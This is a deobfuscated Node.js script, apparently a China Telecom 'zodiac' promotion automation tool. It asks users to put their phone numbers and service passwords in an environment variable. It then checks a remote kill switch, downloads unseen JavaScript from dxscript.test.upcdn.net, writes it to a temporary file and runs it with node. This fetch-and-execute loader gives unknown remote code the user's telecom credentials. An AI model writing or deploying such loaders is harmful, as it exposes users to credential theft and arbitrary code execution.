//Wed Sep 18 2024 14:25:21 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const {
  spawn
} = require("child_process");
const {
  promisify
} = require("util");
const _d_x_0x218643 = promisify(setTimeout);
const _d_x_0x5a38ad = require("fs").promises;
const _d_x_0x22a000 = require("os");
const _d_x_0x31474d = require("path");
const _d_x_0x349636 = require("crypto");
const _d_x_0x20402f = "Zodiac";
const _d_x_0x591f32 = "电信十二生肖脚本";
const _d_x_0x16647f = "http://dxscript.test.upcdn.net/" + _d_x_0x20402f + ".js";
const _d_x_0x391656 = "http://dxscript.test.upcdn.net/" + _d_x_0x20402f + ".json";
async function _d_x_0x241e28() {
  try {
    const _0x1f9dc2 = await import("got");
    const _0x8f315f = await _0x1f9dc2.default(_d_x_0x391656).json();
    const _0x4d88ce = _0x8f315f;
    if (_0x4d88ce.status !== 1) {
      console.log("脚本已停用，有缘再见");
      await _d_x_0x218643(5000);
      process.exit(0);
    } else {
      const _0x4e81be = await _0x1f9dc2.default(_d_x_0x16647f);
      const _0x1e6845 = _0x4e81be.body;
      const _0x1a57af = "自己设置电信的服务密码, 把 手机号#服务密码 填到变量里, 多账号&隔开: \n export chinaTelecomAccount=\"13888888888#123456\"";
      console.log("你正在运行" + _d_x_0x591f32 + "\n\n" + _0x1a57af);
      console.log(_0x4d88ce.updata);
      console.log("\n\n");
      const _0x5dd392 = _d_x_0x349636.randomBytes(16).toString("hex");
      const _0x189514 = _0x5dd392 + ".js";
      const _0x1a4124 = _d_x_0x31474d.join(_d_x_0x22a000.tmpdir(), _0x189514);
      await _d_x_0x5a38ad.writeFile(_0x1a4124, _0x1e6845);
      const _0x52bf98 = _d_x_0x31474d.resolve(__dirname, "node_modules");
      process.env.NODE_PATH = _0x52bf98;
      require("module").Module._initPaths();
      const _0x189e08 = spawn("node", [_0x1a4124]);
      _0x189e08.stdout.on("data", _0x2ad71f => {
        console.log("" + _0x2ad71f);
      });
      _0x189e08.stderr.on("data", _0x9bfcbf => {
        console.error("" + _0x9bfcbf);
      });
      _0x189e08.on("close", _0x4f8f69 => {
        console.log("外部脚本执行完成");
      });
    }
  } catch (_0x5cdc33) {
    console.error("发生错误: " + _0x5cdc33.message);
    console.error(_0x5cdc33.stack);
  }
}
_d_x_0x241e28();